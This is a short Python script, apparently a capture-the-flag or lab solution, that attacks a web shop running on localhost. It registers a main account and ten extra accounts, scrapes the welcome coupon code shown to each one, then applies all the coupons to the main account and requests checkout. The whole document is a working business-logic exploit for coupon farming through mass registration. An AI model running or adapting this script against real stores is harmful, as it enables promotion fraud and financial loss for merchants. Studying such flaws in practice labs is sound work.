import requests
from bs4 import BeautifulSoup

user = "mainuser"
password = "mainpassword"
couponlist = []

s = requests.Session()

r = s.post("http://localhost:5103/register", {"username": user, "password": password})
r = s.post("http://localhost:5103/login", {"username": user, "password": password})
couponlist.append(BeautifulSoup(r.text, "html.parser").h1.text[30:])

for i in range(10):
    r = s.post("http://localhost:5103/register", {"username": user + str(i), "password": password})
    r = s.post("http://localhost:5103/login", {"username": user + str(i), "password": password})
    couponlist.append(BeautifulSoup(r.text, "html.parser").h1.text[30:])

r = s.post("http://localhost:5103/login", {"username": user, "password": password})
for c in couponlist:
    r = s.post("http://localhost:5103/", {"coupon": c})

r = s.get("http://localhost:5103/checkout")

print(r.text)
